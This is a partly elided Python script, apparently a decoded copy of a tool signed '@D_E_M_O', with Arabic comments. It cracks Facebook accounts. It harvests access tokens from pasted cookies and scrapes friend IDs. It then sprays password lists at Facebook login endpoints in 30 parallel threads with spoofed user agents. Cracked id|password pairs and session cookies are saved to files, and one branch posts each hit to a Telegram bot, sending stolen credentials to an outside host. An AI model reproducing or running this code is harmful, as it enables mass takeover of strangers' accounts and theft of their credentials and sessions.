print(('\033[92m—'*25)+'\n• DeCoDe By @D_E_M_O•\n'+('—'*25))
import datetime;now = datetime.date.today();target = datetime.date(2026,3,20,)
if now >=target:print(" @D_E_M_O لا ضوج 💲 راسلني حتى افعلك @$$")
...
id=[]
tokenku=[]
#def login():: هذه الدالة تستخدم لتسجيل الدخول إلى حساب فيسبوك باستخدام الكوكيز. تطلب من المستخدم إدخال الكوكيز وتحاول استخدامها للوصول إلى صفحة "https://business.facebook.com/business_locations"، حيث يتم البحث عن رمز الوصول. ثم يتم حفظ رمز الوصول والكوكيز في ملفات محددة. بعد ذلك، يتم استخدام رمز الوصول للحصول على معلومات المستخدم (الاسم، الهوية، تاريخ الميلاد) من خلال استدعاء واجهة برمجة التطبيقات (API) الخاصة بفيسبوك. إذا نجحت العملية، يتم عرض معلومات المستخدم والتعليق على صفحته. إذا فشلت الكوكيز، يتم إزالة الملفات ذات الصلة وإعادة تشغيل دالة تسجيل الدخول. وفي حالة حدوث أي خطأ، يتم الخروج من البرنامج مع إظهار رسالة تبين نوع الخطأ.
...
#def create_file_login():: هذه الدالة تستخدم لإنشاء ملف يحتوي على قائمة من الهويات (IDs). تطلب الدالة من المستخدم إدخال الكوكيز وتحقق من صلاحيتها. بعد ذلك، تقوم بعرض قائمة من الخيارات للمستخدم، مثل إنشاء ملف يحتوي على مزيج من الهويات أو إنشاء ملف جديد يحتوي على هويات جديدة. بعد اختيار الخيار المناسب، يتم استدعاء إحدى الدوال الفرعية (auto_file() أو new_file()) لإنشاء الملف بناءً على الاختيار الذي قام به المستخدم.
...
#def auto_file(cookies,access_token): و def new_file(cookies,access_token):: هذه الدوال الفرعية تستخدمان لإنشاء الملفات بناءً على الهويات والكوكيز المُمرّرة إليهما كمعلمات. تقوم الدالتان بطلب الهويات من المستخدم واستخدامها للوصول إلى صفحة صديق الفيسبوك، حيث يتم البحث عن الأصدقاء وتسجيل هوياتهم في ملف مؤقت. ثم يتم تصفية الملف لاحتواء فقط على الهويات المطلوبة. بعد ذلك، يتم استدعاء دالة فرعية iamBadBoy() لكل هوية لجمع المزيد من المعلومات عنها. تُحفظ جميع المعلومات في ملف جديد. تتيح هذه الدوال أيضًا إمكانية اختيار اسم الملف المخرج.
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@D_E_M_O.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ😎 : \033[1;32m'+total_ids)
                                        print("\033[1;32m @D_E_M_O ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ🔥")
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m @D_E_M_O ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@D_E_M_O\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@D_E_M_O-OK] %s | %s'%(ids,pas))
                                bn = ('\r\r\033[1;32m [@D_E_M_O-OK] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                open('/sdcard/@D_E_M_O-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@D_E_M_O-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@D_E_M_O-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@D_E_M_O-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@D_E_M_O] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@D_E_M_O-OK] '+ids+' | '+pas+'\033[1;97m')
                                        bn = ('\r\r\033[1;32m [@D_E_M_O-OK] '+ids+' | '+pas+'\033[1;97m')
                                        requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(bn))
                                        open('/sdcard/@D_E_M_O-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@D_E_M_OCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@D_E_M_O-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@D_E_M_O-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@D_E_M_O_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@D_E_M_O-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@D_E_M_O-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
